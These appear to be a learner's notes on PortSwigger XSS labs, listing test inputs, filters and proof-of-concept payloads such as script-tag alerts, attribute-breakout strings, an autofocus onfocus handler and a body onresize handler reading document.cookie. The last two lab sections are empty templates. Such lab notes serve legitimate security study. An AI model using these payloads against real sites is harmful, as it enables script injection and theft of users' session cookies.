# Lab: 0[Reflected XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded)

# ========== level 0 ==========

**PAYLOAD:**

```html
<script>
	alert(1)
</script>
```

# Lab: 1[Stored XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded)

# ========== level 1 ==========

**stored cross-site scripting**

_TEST:_

```html
<script>
	alert(1)
</script>
```

_REFLECT:_

```html
<input type="text" name="email" value="<script>alert(1)</script>" />
```

_SOLUTION:_ break out of form

_PAYLOAD:_

```html
">
<script>
	alert(1)
</script>
<"
```

# Lab: 3[Stored XSS into anchor href attribute with double quotes HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded)

# ========== level 2 ==========

_TEST:_

```html
<script>
	alert(document.URL)
</script>
```

_REFLECT:_

```html
<input type="text" name="email" value="<script&gt;alert(1)</script&gt;" />
```

_FILTER to bypass:_

```html
">" (is sterilized into "&gt;")
```

_SOLUTION:_

not using JS - instead using html5 tags handles:

```html
"autofocus onfocus="alert(1) "autofocus onfocus='alert(1)'
```

_PAYLOAD:_

```htm
"autofocus onfocus="alert(1)
```

# Lab: 4[Reflected XSS into HTML context with most tags and attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)

# ========== level 3 ==========

_TEST:_

```htm
<img src="1" onerror="print()" />
```

_REFLECT:_

```htm
"Tag is not allowed"
```

_FILTER to bypass:_

```
tags <body>
eventHandler onresize
```

_SOLUTION:_
<§§>
_PAYLOAD:_

```htm
<body onresize="alert(document.cookie)%3E"></body>
```

# Lab: 5[DOM XSS in document.write sink using source location.search](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink)

# ========== level 3 ==========

_TEST:_

```htm

```

_REFLECT:_

```htm

```

_FILTER to bypass:_

```

```

_SOLUTION:_

_PAYLOAD:_

```htm

```

# Lab: 6[Lab: DOM XSS in document.write sink using source location.search inside a select element](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element)

# ========== level 3 ==========

_TEST:_

```htm

```

_REFLECT:_

```htm

```

_FILTER to bypass:_

```

```

_SOLUTION:_

_PAYLOAD:_

```htm

```
